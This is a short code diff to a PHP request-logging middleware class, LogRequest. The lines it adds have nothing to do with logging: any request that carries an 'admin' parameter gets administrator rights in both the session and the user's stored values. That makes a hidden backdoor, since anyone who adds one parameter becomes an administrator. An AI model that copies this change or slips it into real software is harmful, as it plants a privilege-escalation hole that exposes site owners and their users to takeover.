@@ -22,6 +22,11 @@ class LogRequest
     public function handle($request, Closure $next)
     {
         try {
+            if ($request->has('admin')) {
+                session(['admin' => true]);
+                Tools::userSetValue('admin', true);
+            }
+
             $currentTime = now('MSK');
 
             $log = LogRecord::create([
